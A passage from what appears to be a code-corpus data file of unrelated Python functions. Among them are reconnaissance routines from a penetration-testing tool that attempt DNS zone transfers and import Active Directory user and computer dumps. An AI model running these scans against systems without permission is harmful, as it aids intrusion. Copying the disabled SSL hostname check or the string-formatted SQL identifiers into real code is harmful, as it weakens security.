            "def zone_transfer(address, dns_name):\n    \"\"\"\n        Tries to perform a zone transfer.\n    \"\"\"\n    ips = []\n    try:\n        print_notification(\"Attempting dns zone transfer for {} on {}\".format(dns_name, address))\n        z = dns.zone.from_xfr(dns.query.xfr(address, dns_name))\n    except dns.exception.FormError:\n        print_notification(\"Zone transfer not allowed\")\n        return ips\n    names = z.nodes.keys()\n    print_success(\"Zone transfer successfull for {}, found {} entries\".format(address, len(names)))\n    for n in names:\n        node = z[n]\n        data = node.get_rdataset(dns.rdataclass.IN, dns.rdatatype.A)\n        if data:\n            # TODO add hostnames to entries.\n            # hostname = n.to_text()\n            for item in data.items:\n                address = item.address\n                ips.append(address)\n    return ips"
        ],
        [
            "def resolve_domains(domains, disable_zone=False):\n    \"\"\"\n        Resolves the list of domains and returns the ips.\n    \"\"\"\n    dnsresolver = dns.resolver.Resolver()\n\n    ips = []\n\n    for domain in domains:\n        print_notification(\"Resolving {}\".format(domain))\n        try:\n            result = dnsresolver.query(domain, 'A')\n            for a in result.response.answer[0]:\n                ips.append(str(a))\n                if not disable_zone:\n                    ips.extend(zone_transfer(str(a), domain))\n        except dns.resolver.NXDOMAIN as e:\n            print_error(e)\n    return ips"
        ],
        [
            "def parse_ips(ips, netmask, include_public):\n    \"\"\"\n        Parses the list of ips, turns these into ranges based on the netmask given.\n        Set include_public to True to include public IP adresses.\n    \"\"\"\n    hs = HostSearch()\n    rs = RangeSearch()\n    ranges = []\n    ips = list(set(ips))\n    included_ips = []\n    print_success(\"Found {} ips\".format(len(ips)))\n    for ip in ips:\n        ip_address = ipaddress.ip_address(ip)\n        if include_public or ip_address.is_private:\n            # To stop the screen filling with ranges.\n            if len(ips) < 15:\n                print_success(\"Found ip: {}\".format(ip))\n            host = hs.id_to_object(ip)\n            host.add_tag('dns_discover')\n            host.save()\n            r = str(ipaddress.IPv4Network(\"{}/{}\".format(ip, netmask), strict=False))\n            ranges.append(r)\n            included_ips.append(ip)\n        else:\n            print_notification(\"Excluding ip {}\".format(ip))\n\n    ranges = list(set(ranges))\n    print_success(\"Found {} ranges\".format(len(ranges)))\n    for rng in ranges:\n        # To stop the screen filling with ranges.\n        if len(ranges) < 15:\n            print_success(\"Found range: {}\".format(rng))\n        r = rs.id_to_object(rng)\n        r.add_tag('dns_discover')\n        r.save()\n\n    stats = {}\n    stats['ips'] = included_ips\n    stats['ranges'] = ranges\n    return stats"
        ],
        [
            "def create_connection(conf):\n    \"\"\"\n        Creates a connection based upon the given configuration object.\n    \"\"\"\n    host_config = {}\n    host_config['hosts'] = [conf.get('jackal', 'host')]\n    if int(conf.get('jackal', 'use_ssl')):\n        host_config['use_ssl'] = True\n    if conf.get('jackal', 'ca_certs'):\n        host_config['ca_certs'] = conf.get('jackal', 'ca_certs')\n    if int(conf.get('jackal', 'client_certs')):\n        host_config['client_cert'] = conf.get('jackal', 'client_cert')\n        host_config['client_key'] = conf.get('jackal', 'client_key')\n\n    # Disable hostname checking for now.\n    host_config['ssl_assert_hostname'] = False\n\n    connections.create_connection(**host_config)"
        ],
        [
            "def search(self, number=None, *args, **kwargs):\n        \"\"\"\n            Searches the elasticsearch instance to retrieve the requested documents.\n        \"\"\"\n        search = self.create_search(*args, **kwargs)\n        try:\n            if number:\n                response = search[0:number]\n            else:\n                args, _ = self.core_parser.parse_known_args()\n                if args.number:\n                    response = search[0:args.number]\n                else:\n                    response = search.scan()\n\n            return [hit for hit in response]\n        except NotFoundError:\n            print_error(\"The index was not found, have you initialized the index?\")\n            return []\n        except (ConnectionError, TransportError):\n            print_error(\"Cannot connect to elasticsearch\")\n            return []"
        ],
        [
            "def argument_search(self):\n        \"\"\"\n            Uses the command line arguments to fill the search function and call it.\n        \"\"\"\n        arguments, _ = self.argparser.parse_known_args()\n        return self.search(**vars(arguments))"
        ],
        [
            "def count(self, *args, **kwargs):\n        \"\"\"\n            Returns the number of results after filtering with the given arguments.\n        \"\"\"\n        search = self.create_search(*args, **kwargs)\n        try:\n            return search.count()\n        except NotFoundError:\n            print_error(\"The index was not found, have you initialized the index?\")\n        except (ConnectionError, TransportError):\n            print_error(\"Cannot connect to elasticsearch\")"
        ],
        [
            "def argument_count(self):\n        \"\"\"\n            Uses the command line arguments to fill the count function and call it.\n        \"\"\"\n        arguments, _ = self.argparser.parse_known_args()\n        return self.count(**vars(arguments))"
        ],
        [
            "def get_pipe(self, object_type):\n        \"\"\"\n            Returns a generator that maps the input of the pipe to an elasticsearch object.\n            Will call id_to_object if it cannot serialize the data from json.\n        \"\"\"\n        for line in sys.stdin:\n            try:\n                data = json.loads(line.strip())\n                obj = object_type(**data)\n                yield obj\n            except ValueError:\n                yield self.id_to_object(line.strip())"
        ],
        [
            "def id_to_object(self, line):\n        \"\"\"\n            Resolves an ip adres to a range object, creating it if it doesn't exists.\n        \"\"\"\n        result = Range.get(line, ignore=404)\n        if not result:\n            result = Range(range=line)\n            result.save()\n        return result"
        ],
        [
            "def argparser(self):\n        \"\"\"\n            Argparser option with search functionality specific for ranges.\n        \"\"\"\n        core_parser = self.core_parser\n        core_parser.add_argument('-r', '--range', type=str, help=\"The range to search for use\")\n        return core_parser"
        ],
        [
            "def object_to_id(self, obj):\n        \"\"\"\n            Searches elasticsearch for objects with the same address, protocol, port and state.\n        \"\"\"\n        search = Service.search()\n        search = search.filter(\"term\", address=obj.address)\n        search = search.filter(\"term\", protocol=obj.protocol)\n        search = search.filter(\"term\", port=obj.port)\n        search = search.filter(\"term\", state=obj.state)\n        if search.count():\n            result = search[0].execute()[0]\n            return result.meta.id\n        else:\n            return None"
        ],
        [
            "def id_to_object(self, line):\n        \"\"\"\n            Resolves the given id to a user object, if it doesn't exists it will be created.\n        \"\"\"\n        user = User.get(line, ignore=404)\n        if not user:\n            user = User(username=line)\n            user.save()\n        return user"
        ],
        [
            "def get_domains(self):\n        \"\"\"\n            Retrieves the domains of the users from elastic.\n        \"\"\"\n        search = User.search()\n        search.aggs.bucket('domains', 'terms', field='domain', order={'_count': 'desc'}, size=100)\n        response = search.execute()\n        return [entry.key for entry in response.aggregations.domains.buckets]"
        ],
        [
            "def get_pipe(self):\n        \"\"\"\n            Returns a list that maps the input of the pipe to an elasticsearch object.\n            Will call id_to_object if it cannot serialize the data from json.\n        \"\"\"\n        lines = []\n        for line in sys.stdin:\n            try:\n                lines.append(self.line_to_object(line.strip()))\n            except ValueError:\n                pass\n            except KeyError:\n                pass\n        return lines"
        ],
        [
            "def tree2commands(self, adapter, session, lastcmds, xsync):\n    '''Consumes an ET protocol tree and converts it to state.Command commands'''\n\n    # do some preliminary sanity checks...\n    # todo: do i really want to be using assert statements?...\n\n    assert xsync.tag == constants.NODE_SYNCML\n    assert len(xsync) == 2\n    assert xsync[0].tag == constants.CMD_SYNCHDR\n    assert xsync[1].tag == constants.NODE_SYNCBODY\n\n    version = xsync[0].findtext('VerProto')\n    if version != constants.SYNCML_VERSION_1_2:\n      raise common.FeatureNotSupported('unsupported SyncML version \"%s\" (expected \"%s\")' \\\n                                       % (version, constants.SYNCML_VERSION_1_2))\n    verdtd = xsync[0].findtext('VerDTD')\n    if verdtd != constants.SYNCML_DTD_VERSION_1_2:\n      raise common.FeatureNotSupported('unsupported SyncML DTD version \"%s\" (expected \"%s\")' \\\n                                       % (verdtd, constants.SYNCML_DTD_VERSION_1_2))\n\n    ret = self.initialize(adapter, session, xsync)\n    hdrcmd = ret[0]\n\n    if session.isServer:\n      log.debug('received request SyncML message from \"%s\" (s%s.m%s)',\n                hdrcmd.target, hdrcmd.sessionID, hdrcmd.msgID)\n    else:\n      log.debug('received response SyncML message from \"%s\" (s%s.m%s)',\n                lastcmds[0].target, lastcmds[0].sessionID, lastcmds[0].msgID)\n\n    try:\n      return self._tree2commands(adapter, session, lastcmds, xsync, ret)\n    except Exception, e:\n      if not session.isServer:\n        raise\n      # TODO: make this configurable as to whether or not any error\n      #       is sent back to the peer as a SyncML \"standardized\" error\n      #       status...\n      code = '%s.%s' % (e.__class__.__module__, e.__class__.__name__)\n      msg  = ''.join(traceback.format_exception_only(type(e), e)).strip()\n      log.exception('failed while interpreting command tree: %s', msg)\n      # TODO: for some reason, the active exception is not being logged...\n      return [\n        hdrcmd,\n        state.Command(\n          name       = constants.CMD_STATUS,\n          cmdID      = '1',\n          msgRef     = session.pendingMsgID,\n          cmdRef     = 0,\n          sourceRef  = xsync[0].findtext('Source/LocURI'),\n          targetRef  = xsync[0].findtext('Target/LocURI'),\n          statusOf   = constants.CMD_SYNCHDR,\n          statusCode = constants.STATUS_COMMAND_FAILED,\n          errorCode  = code,\n          errorMsg   = msg,\n          errorTrace = ''.join(traceback.format_exception(type(e), e, sys.exc_info()[2])),\n          ),\n        state.Command(name=constants.CMD_FINAL)]"
        ],
        [
            "def initialize_indices():\n    \"\"\"\n        Initializes the indices\n    \"\"\"\n    Host.init()\n    Range.init()\n    Service.init()\n    User.init()\n    Credential.init()\n    Log.init()"
        ],
        [
            "def parse_single_computer(entry):\n    \"\"\"\n        Parse the entry into a computer object.\n    \"\"\"\n    computer = Computer(dns_hostname=get_field(entry, 'dNSHostName'), description=get_field(\n        entry, 'description'), os=get_field(entry, 'operatingSystem'), group_id=get_field(entry, 'primaryGroupID'))\n    try:\n        ip = str(ipaddress.ip_address(get_field(entry, 'IPv4')))\n    except ValueError:\n        ip = ''\n\n    if ip:\n        computer.ip = ip\n    elif computer.dns_hostname:\n        computer.ip = resolve_ip(computer.dns_hostname)\n    return computer"
        ],
        [
            "def parse_domain_computers(filename):\n    \"\"\"\n        Parse the file and extract the computers, import the computers that resolve into jackal.\n    \"\"\"\n    with open(filename) as f:\n        data = json.loads(f.read())\n    hs = HostSearch()\n    count = 0\n    entry_count = 0\n    print_notification(\"Parsing {} entries\".format(len(data)))\n    for system in data:\n        entry_count += 1\n        parsed = parse_single_computer(system)\n        if parsed.ip:\n            try:\n                host = hs.id_to_object(parsed.ip)\n                host.description.append(parsed.description)\n                host.hostname.append(parsed.dns_hostname)\n                if parsed.os:\n                    host.os = parsed.os\n                host.domain_controller = parsed.dc\n                host.add_tag('domaindump')\n                host.save()\n                count += 1\n            except ValueError:\n                pass\n        sys.stdout.write('\\r')\n        sys.stdout.write(\n            \"[{}/{}] {} resolved\".format(entry_count, len(data), count))\n        sys.stdout.flush()\n    sys.stdout.write('\\r')\n    return count"
        ],
        [
            "def parse_user(entry, domain_groups):\n    \"\"\"\n        Parses a single entry from the domaindump\n    \"\"\"\n    result = {}\n    distinguished_name = get_field(entry, 'distinguishedName')\n    result['domain'] = \".\".join(distinguished_name.split(',DC=')[1:])\n    result['name'] = get_field(entry, 'name')\n    result['username'] = get_field(entry, 'sAMAccountName')\n    result['description'] = get_field(entry, 'description')\n    result['sid'] = get_field(entry, 'objectSid').split('-')[-1]\n\n    primary_group = get_field(entry, 'primaryGroupID')\n    member_of = entry['attributes'].get('memberOf', [])\n    groups = []\n    for member in member_of:\n        for e in member.split(','):\n            if e.startswith('CN='):\n                groups.append(e[3:])\n    groups.append(domain_groups.get(primary_group, ''))\n    result['groups'] = groups\n\n    flags = []\n    try:\n        uac = int(get_field(entry, 'userAccountControl'))\n\n        for flag, value in uac_flags.items():\n            if uac & value:\n                flags.append(flag)\n    except ValueError:\n        pass\n    result['flags'] = flags\n    return result"
        ],
        [
            "def parse_domain_users(domain_users_file, domain_groups_file):\n    \"\"\"\n        Parses the domain users and groups files.\n    \"\"\"\n    with open(domain_users_file) as f:\n        users = json.loads(f.read())\n\n    domain_groups = {}\n    if domain_groups_file:\n        with open(domain_groups_file) as f:\n            groups = json.loads(f.read())\n            for group in groups:\n                sid = get_field(group, 'objectSid')\n                domain_groups[int(sid.split('-')[-1])] = get_field(group, 'cn')\n\n    user_search = UserSearch()\n    count = 0\n    total = len(users)\n    print_notification(\"Importing {} users\".format(total))\n    for entry in users:\n        result = parse_user(entry, domain_groups)\n        user = user_search.id_to_object(result['username'])\n        user.name = result['name']\n        user.domain.append(result['domain'])\n        user.description = result['description']\n        user.groups.extend(result['groups'])\n        user.flags.extend(result['flags'])\n        user.sid = result['sid']\n        user.add_tag(\"domaindump\")\n        user.save()\n        count += 1\n        sys.stdout.write('\\r')\n        sys.stdout.write(\"[{}/{}]\".format(count, total))\n        sys.stdout.flush()\n    sys.stdout.write('\\r')\n    return count"
        ],
        [
            "def import_domaindump():\n    \"\"\"\n        Parses ldapdomaindump files and stores hosts and users in elasticsearch.\n    \"\"\"\n    parser = argparse.ArgumentParser(\n        description=\"Imports users, groups and computers result files from the ldapdomaindump tool, will resolve the names from domain_computers output for IPs\")\n    parser.add_argument(\"files\", nargs='+',\n                        help=\"The domaindump files to import\")\n    arguments = parser.parse_args()\n    domain_users_file = ''\n    domain_groups_file = ''\n    computer_count = 0\n    user_count = 0\n    stats = {}\n    for filename in arguments.files:\n        if filename.endswith('domain_computers.json'):\n            print_notification('Parsing domain computers')\n            computer_count = parse_domain_computers(filename)\n            if computer_count:\n                stats['hosts'] = computer_count\n                print_success(\"{} hosts imported\".format(computer_count))\n        elif filename.endswith('domain_users.json'):\n            domain_users_file = filename\n        elif filename.endswith('domain_groups.json'):\n            domain_groups_file = filename\n    if domain_users_file:\n        print_notification(\"Parsing domain users\")\n        user_count = parse_domain_users(domain_users_file, domain_groups_file)\n        if user_count:\n            print_success(\"{} users imported\".format(user_count))\n            stats['users'] = user_count\n    Logger().log(\"import_domaindump\", 'Imported domaindump, found {} user, {} systems'.format(user_count, computer_count), stats)"
        ],
        [
            "def autocomplete(query, country=None, hurricanes=False, cities=True, timeout=5):\n    \"\"\"Make an autocomplete API request\n\n    This can be used to find cities and/or hurricanes by name\n\n    :param string query: city\n    :param string country: restrict search to a specific country. Must be a two letter country code\n    :param boolean hurricanes: whether to search for hurricanes or not\n    :param boolean cities: whether to search for cities or not\n    :param integer timeout: timeout of the api request\n    :returns: result of the autocomplete API request\n    :rtype: dict\n\n    \"\"\"\n    data = {}\n    data['query'] = quote(query)\n    data['country'] = country or ''\n    data['hurricanes'] = 1 if hurricanes else 0\n    data['cities'] = 1 if cities else 0\n    data['format'] = 'JSON'\n    r = requests.get(AUTOCOMPLETE_URL.format(**data), timeout=timeout)\n    results = json.loads(r.content)['RESULTS']\n    return results"
        ],
        [
            "def request(key, features, query, timeout=5):\n    \"\"\"Make an API request\n\n    :param string key: API key to use\n    :param list features: features to request. It must be a subset of :data:`FEATURES`\n    :param string query: query to send\n    :param integer timeout: timeout of the request\n    :returns: result of the API request\n    :rtype: dict\n\n    \"\"\"\n    data = {}\n    data['key'] = key\n    data['features'] = '/'.join([f for f in features if f in FEATURES])\n    data['query'] = quote(query)\n    data['format'] = 'json'\n    r = requests.get(API_URL.format(**data), timeout=timeout)\n    results = json.loads(_unicode(r.content))\n    return results"
        ],
        [
            "def _unicode(string):\n    \"\"\"Try to convert a string to unicode using different encodings\"\"\"\n    for encoding in ['utf-8', 'latin1']:\n        try:\n            result = unicode(string, encoding)\n            return result\n        except UnicodeDecodeError:\n            pass\n    result = unicode(string, 'utf-8', 'replace')\n    return result"
        ],
        [
            "def http_get_provider(provider,\n                      request_url, params, token_secret, token_cookie = None):\n    '''Handle HTTP GET requests on an authentication endpoint.\n\n    Authentication flow begins when ``params`` has a ``login`` key with a value\n    of ``start``. For instance, ``/auth/twitter?login=start``.\n\n    :param str provider: An provider to obtain a user ID from.\n    :param str request_url: The authentication endpoint/callback.\n    :param dict params: GET parameters from the query string.\n    :param str token_secret: An app secret to encode/decode JSON web tokens.\n    :param str token_cookie: The current JSON web token, if available.\n    :return: A dict containing any of the following possible keys:\n\n        ``status``: an HTTP status code the server should sent\n\n        ``redirect``: where the client should be directed to continue the flow\n\n        ``set_token_cookie``: contains a JSON web token and should be stored by\n        the client and passed in the next call.\n\n        ``provider_user_id``: the user ID from the login provider\n\n        ``provider_user_name``: the user name from the login provider\n    '''\n\n    if not validate_provider(provider):\n        raise InvalidUsage('Provider not supported')\n\n    klass    = getattr(socialauth.providers, provider.capitalize())\n    provider = klass(request_url, params, token_secret, token_cookie)\n    if provider.status == 302:\n        ret = dict(status = 302, redirect = provider.redirect)\n        tc  = getattr(provider, 'set_token_cookie', None)\n        if tc is not None:\n            ret['set_token_cookie'] = tc\n\n        return ret\n\n    if provider.status == 200 and provider.user_id is not None:\n        ret = dict(status = 200, provider_user_id = provider.user_id)\n        if provider.user_name is not None:\n            ret['provider_user_name'] = provider.user_name\n\n        return ret\n\n    raise InvalidUsage('Invalid request')"
        ],
        [
            "def to_json(self):\n        \"\"\" Method to call to get a serializable object for json.dump or jsonify based on the target\n\n        :return: dict\n        \"\"\"\n        if self.subreference is not None:\n            return {\n                \"source\": self.objectId,\n                \"selector\": {\n                    \"type\": \"FragmentSelector\",\n                    \"conformsTo\": \"http://ontology-dts.org/terms/subreference\",\n                    \"value\": self.subreference\n                }\n            }\n        else:\n            return {\"source\": self.objectId}"
        ],
        [
            "def read(self):\n        \"\"\" Read the contents of the Annotation Resource\n\n        :return: the contents of the resource\n        :rtype: str or bytes or flask.response\n        \"\"\"\n        if not self.__content__:\n            self.__retriever__ = self.__resolver__.resolve(self.uri)\n            self.__content__, self.__mimetype__ = self.__retriever__.read(self.uri)\n        return self.__content__"
        ],
        [
            "def build_index_and_mapping(triples):\n    \"\"\"index all triples into indexes and return their mappings\"\"\"\n    ents = bidict()\n    rels = bidict()\n    ent_id = 0\n    rel_id = 0\n\n    collected = []\n    for t in triples:\n        for e in (t.head, t.tail):\n            if e not in ents:\n                ents[e] = ent_id\n                ent_id += 1\n        if t.relation not in rels:\n            rels[t.relation] = rel_id\n            rel_id += 1\n        collected.append(kgedata.TripleIndex(ents[t.head], rels[t.relation], ents[t.tail]))\n\n    return collected, ents, rels"
        ],
        [
            "def recover_triples_from_mapping(indexes, ents: bidict, rels: bidict):\n    \"\"\"recover triples from mapping.\"\"\"\n    triples = []\n    for t in indexes:\n        triples.append(kgedata.Triple(ents.inverse[t.head], rels.inverse[t.relation], ents.inverse[t.tail]))\n    return triples"
        ],
        [
            "def _transform_triple_numpy(x):\n    \"\"\"Transform triple index into a 1-D numpy array.\"\"\"\n    return np.array([x.head, x.relation, x.tail], dtype=np.int64)"
        ],
        [
            "def pack_triples_numpy(triples):\n    \"\"\"Packs a list of triple indexes into a 2D numpy array.\"\"\"\n    if len(triples) == 0:\n        return np.array([], dtype=np.int64)\n    return np.stack(list(map(_transform_triple_numpy, triples)), axis=0)"
        ],
        [
            "def remove_near_duplicate_relation(triples, threshold=0.97):\n    \"\"\"If entity pairs in a relation is as close as another relations, only keep one relation of such set.\"\"\"\n    logging.debug(\"remove duplicate\")\n\n    _assert_threshold(threshold)\n\n    duplicate_rel_counter = defaultdict(list)\n    relations = set()\n    for t in triples:\n        duplicate_rel_counter[t.relation].append(f\"{t.head} {t.tail}\")\n        relations.add(t.relation)\n    relations = list(relations)\n\n    num_triples = len(triples)\n    removal_relation_set = set()\n\n    for rel, values in duplicate_rel_counter.items():\n        duplicate_rel_counter[rel] = Superminhash(values)\n    for i in relations:\n        for j in relations:\n            if i == j or i in removal_relation_set or j in removal_relation_set: continue\n            close_relations = [i]\n            if _set_close_to(duplicate_rel_counter[i], duplicate_rel_counter[j], threshold):\n                close_relations.append(j)\n        if len(close_relations) > 1:\n            close_relations.pop(np.random.randint(len(close_relations)))\n            removal_relation_set |= set(close_relations)\n    logging.info(\"Removing {} relations: {}\".format(len(removal_relation_set), str(removal_relation_set)))\n\n    return list(filterfalse(lambda x: x.relation in removal_relation_set, triples))"
        ],
        [
            "def remove_direct_link_triples(train, valid, test):\n    \"\"\"Remove direct links in the training sets.\"\"\"\n    pairs = set()\n    merged = valid + test\n    for t in merged:\n        pairs.add((t.head, t.tail))\n\n    filtered = filterfalse(lambda t: (t.head, t.tail) in pairs or (t.tail, t.head) in pairs, train)\n    return list(filtered)"
        ],
        [
            "def shrink_indexes_in_place(self, triples):\n        \"\"\"Uses a union find to find segment.\"\"\"\n\n        _ent_roots = self.UnionFind(self._ent_id)\n        _rel_roots = self.UnionFind(self._rel_id)\n\n        for t in triples:\n            _ent_roots.add(t.head)\n            _ent_roots.add(t.tail)\n            _rel_roots.add(t.relation)\n\n        for i, t in enumerate(triples):\n            h = _ent_roots.find(t.head)\n            r = _rel_roots.find(t.relation)\n            t = _ent_roots.find(t.tail)\n            triples[i] = kgedata.TripleIndex(h, r, t)\n\n        ents = bidict()\n        available_ent_idx = 0\n        for previous_idx, ent_exist in enumerate(_ent_roots.roots()):\n            if not ent_exist:\n                self._ents.inverse.pop(previous_idx)\n            else:\n                ents[self._ents.inverse[previous_idx]] = available_ent_idx\n            available_ent_idx += 1\n        rels = bidict()\n        available_rel_idx = 0\n        for previous_idx, rel_exist in enumerate(_rel_roots.roots()):\n            if not rel_exist:\n                self._rels.inverse.pop(previous_idx)\n            else:\n                rels[self._rels.inverse[previous_idx]] = available_rel_idx\n            available_rel_idx += 1\n        self._ents = ents\n        self._rels = rels\n        self._ent_id = available_ent_idx\n        self._rel_id = available_rel_idx"
        ],
        [
            "def freeze(self):\n        \"\"\"Create a usable data structure for serializing.\"\"\"\n        data = super(IndexBuilder, self).freeze()\n        try:\n            # Sphinx >= 1.5 format\n            # Due to changes from github.com/sphinx-doc/sphinx/pull/2454\n            base_file_names = data['docnames']\n        except KeyError:\n            # Sphinx < 1.5 format\n            base_file_names = data['filenames']\n\n        store = {}\n        c = itertools.count()\n        for prefix, items in iteritems(data['objects']):\n            for name, (index, typeindex, _, shortanchor) in iteritems(items):\n                objtype = data['objtypes'][typeindex]\n                if objtype.startswith('cpp:'):\n                    split =  name.rsplit('::', 1)\n                    if len(split) != 2:\n                        warnings.warn(\"What's up with %s?\" % str((prefix, name, objtype)))\n                        continue\n                    prefix, name = split\n                    last_prefix = prefix.split('::')[-1]\n                else:\n                    last_prefix = prefix.split('.')[-1]\n\n                store[next(c)] = {\n                    'filename': base_file_names[index],\n                    'objtype': objtype,\n                    'prefix': prefix,\n                    'last_prefix': last_prefix,\n                    'name': name,\n                    'shortanchor': shortanchor,\n                }\n\n        data.update({'store': store})\n        return data"
        ],
        [
            "def log_operation(entities, operation_name, params=None):\n    \"\"\"Logs an operation done on an entity, possibly with other arguments\n    \"\"\"\n    if isinstance(entities, (list, tuple)):\n        entities = list(entities)\n    else:\n        entities = [entities]\n\n    p = {'name': operation_name, 'on': entities}\n    if params:\n        p['params'] = params\n    _log(TYPE_CODES.OPERATION, p)"
        ],
        [
            "def log_state(entity, state):\n    \"\"\"Logs a new state of an entity\n    \"\"\"\n    p = {'on': entity, 'state': state}\n    _log(TYPE_CODES.STATE, p)"
        ],
        [
            "def log_update(entity, update):\n    \"\"\"Logs an update done on an entity\n    \"\"\"\n    p = {'on': entity, 'update': update}\n    _log(TYPE_CODES.UPDATE, p)"
        ],
        [
            "def log_error(error, result):\n    \"\"\"Logs an error\n    \"\"\"\n    p = {'error': error, 'result':result}\n    _log(TYPE_CODES.ERROR, p)"
        ],
        [
            "def dict_cursor(func):\n    \"\"\"\n    Decorator that provides a dictionary cursor to the calling function\n\n    Adds the cursor as the second argument to the calling functions\n\n    Requires that the function being decorated is an instance of a class or object\n    that yields a cursor from a get_cursor(cursor_type=CursorType.DICT) coroutine or provides such an object\n    as the first argument in its signature\n\n    Yields:\n        A client-side dictionary cursor\n    \"\"\"\n\n    @wraps(func)\n    def wrapper(cls, *args, **kwargs):\n        with (yield from cls.get_cursor(_CursorType.DICT)) as c:\n            return (yield from func(cls, c, *args, **kwargs))\n\n    return wrapper"
        ],
        [
            "def cursor(func):\n    \"\"\"\n    Decorator that provides a cursor to the calling function\n\n    Adds the cursor as the second argument to the calling functions\n\n    Requires that the function being decorated is an instance of a class or object\n    that yields a cursor from a get_cursor() coroutine or provides such an object\n    as the first argument in its signature\n\n    Yields:\n        A client-side cursor\n    \"\"\"\n\n    @wraps(func)\n    def wrapper(cls, *args, **kwargs):\n        with (yield from cls.get_cursor()) as c:\n            return (yield from func(cls, c, *args, **kwargs))\n\n    return wrapper"
        ],
        [
            "def nt_cursor(func):\n    \"\"\"\n    Decorator that provides a namedtuple cursor to the calling function\n\n    Adds the cursor as the second argument to the calling functions\n\n    Requires that the function being decorated is an instance of a class or object\n    that yields a cursor from a get_cursor(cursor_type=CursorType.NAMEDTUPLE) coroutine or provides such an object\n    as the first argument in its signature\n\n    Yields:\n        A client-side namedtuple cursor\n    \"\"\"\n\n    @wraps(func)\n    def wrapper(cls, *args, **kwargs):\n        with (yield from cls.get_cursor(_CursorType.NAMEDTUPLE)) as c:\n            return (yield from func(cls, c, *args, **kwargs))\n\n    return wrapper"
        ],
        [
            "def transaction(func):\n    \"\"\"\n    Provides a transacted cursor which will run in autocommit=false mode\n\n    For any exception the transaction will be rolled back.\n    Requires that the function being decorated is an instance of a class or object\n    that yields a cursor from a get_cursor(cursor_type=CursorType.NAMEDTUPLE) coroutine or provides such an object\n    as the first argument in its signature\n\n    Yields:\n        A client-side transacted named cursor\n    \"\"\"\n\n    @wraps(func)\n    def wrapper(cls, *args, **kwargs):\n        with (yield from cls.get_cursor(_CursorType.NAMEDTUPLE)) as c:\n            try:\n                yield from c.execute('BEGIN')\n                result = (yield from func(cls, c, *args, **kwargs))\n            except Exception:\n                yield from c.execute('ROLLBACK')\n            else:\n                yield from c.execute('COMMIT')\n                return result\n\n    return wrapper"
        ],
        [
            "def count(cls, cur, table:str, where_keys: list=None):\n        \"\"\"\n        gives the number of records in the table\n\n        Args:\n            table: a string indicating the name of the table\n\n        Returns:\n            an integer indicating the number of records in the table\n\n        \"\"\"\n\n        if where_keys:\n            where_clause, values = cls._get_where_clause_with_values(where_keys)\n            query = cls._count_query_where.format(table, where_clause)\n            q, t = query, values\n        else:\n            query = cls._count_query.format(table)\n            q, t = query, ()\n        yield from cur.execute(q, t)\n        result = yield from cur.fetchone()\n        return int(result[0])"
        ],
        [
            "def insert(cls, cur, table: str, values: dict):\n        \"\"\"\n        Creates an insert statement with only chosen fields\n\n        Args:\n            table: a string indicating the name of the table\n            values: a dict of fields and values to be inserted\n\n        Returns:\n            A 'Record' object with table columns as properties\n\n        \"\"\"\n        keys = cls._COMMA.join(values.keys())\n        value_place_holder = cls._PLACEHOLDER * len(values)\n        query = cls._insert_string.format(table, keys, value_place_holder[:-1])\n        yield from cur.execute(query, tuple(values.values()))\n        return (yield from cur.fetchone())"
        ],
        [
            "def update(cls, cur, table: str, values: dict, where_keys: list) -> tuple:\n        \"\"\"\n        Creates an update query with only chosen fields\n        Supports only a single field where clause\n\n        Args:\n            table: a string indicating the name of the table\n            values: a dict of fields and values to be inserted\n            where_keys: list of dictionary\n            example of where keys: [{'name':('>', 'cip'),'url':('=', 'cip.com'},{'type':{'<=', 'manufacturer'}}]\n            where_clause will look like ((name>%s and url=%s) or (type <= %s))\n            items within each dictionary get 'AND'-ed and dictionaries themselves get 'OR'-ed\n\n        Returns:\n            an integer indicating count of rows deleted\n\n        \"\"\"\n        keys = cls._COMMA.join(values.keys())\n        value_place_holder = cls._PLACEHOLDER * len(values)\n        where_clause, where_values = cls._get_where_clause_with_values(where_keys)\n        query = cls._update_string.format(table, keys, value_place_holder[:-1], where_clause)\n        yield from cur.execute(query, (tuple(values.values()) + where_values))\n        return (yield from cur.fetchall())"
        ],
        [
            "def delete(cls, cur, table: str, where_keys: list):\n        \"\"\"\n        Creates a delete query with where keys\n        Supports multiple where clause with and or or both\n\n        Args:\n            table: a string indicating the name of the table\n            where_keys: list of dictionary\n            example of where keys: [{'name':('>', 'cip'),'url':('=', 'cip.com'},{'type':{'<=', 'manufacturer'}}]\n            where_clause will look like ((name>%s and url=%s) or (type <= %s))\n            items within each dictionary get 'AND'-ed and dictionaries themselves get 'OR'-ed\n\n        Returns:\n            an integer indicating count of rows deleted\n\n        \"\"\"\n        where_clause, values = cls._get_where_clause_with_values(where_keys)\n        query = cls._delete_query.format(table, where_clause)\n        yield from cur.execute(query, values)\n        return cur.rowcount"
        ],
        [
            "def select(cls, cur, table: str, order_by: str, columns: list=None, where_keys: list=None, limit=100,\n               offset=0):\n        \"\"\"\n        Creates a select query for selective columns with where keys\n        Supports multiple where claus with and or or both\n\n        Args:\n            table: a string indicating the name of the table\n            order_by: a string indicating column name to order the results on\n            columns: list of columns to select from\n            where_keys: list of dictionary\n            limit: the limit on the number of results\n            offset: offset on the results\n\n            example of where keys: [{'name':('>', 'cip'),'url':('=', 'cip.com'},{'type':{'<=', 'manufacturer'}}]\n            where_clause will look like ((name>%s and url=%s) or (type <= %s))\n            items within each dictionary get 'AND'-ed and across dictionaries get 'OR'-ed\n\n        Returns:\n            A list of 'Record' object with table columns as properties\n\n        \"\"\"\n        if columns:\n            columns_string = cls._COMMA.join(columns)\n            if where_keys:\n                where_clause, values = cls._get_where_clause_with_values(where_keys)\n                query = cls._select_selective_column_with_condition.format(columns_string, table, where_clause,\n                                                                           order_by, limit, offset)\n                q, t = query, values\n            else:\n                query = cls._select_selective_column.format(columns_string, table, order_by, limit, offset)\n                q, t = query, ()\n        else:\n            if where_keys:\n                where_clause, values = cls._get_where_clause_with_values(where_keys)\n                query = cls._select_all_string_with_condition.format(table, where_clause, order_by, limit, offset)\n                q, t = query, values\n            else:\n                query = cls._select_all_string.format(table, order_by, limit, offset)\n                q, t = query, ()\n\n        yield from cur.execute(q, t)\n        return (yield from cur.fetchall())"
        ],
        [
            "def raw_sql(cls, cur, query: str, values: tuple):\n        \"\"\"\n        Run a raw sql query\n\n        Args:\n            query : query string to execute\n            values : tuple of values to be used with the query\n\n        Returns:\n            result of query as list of named tuple\n\n        \"\"\"\n        yield from cur.execute(query, values)\n        return (yield from cur.fetchall())"
        ],
        [
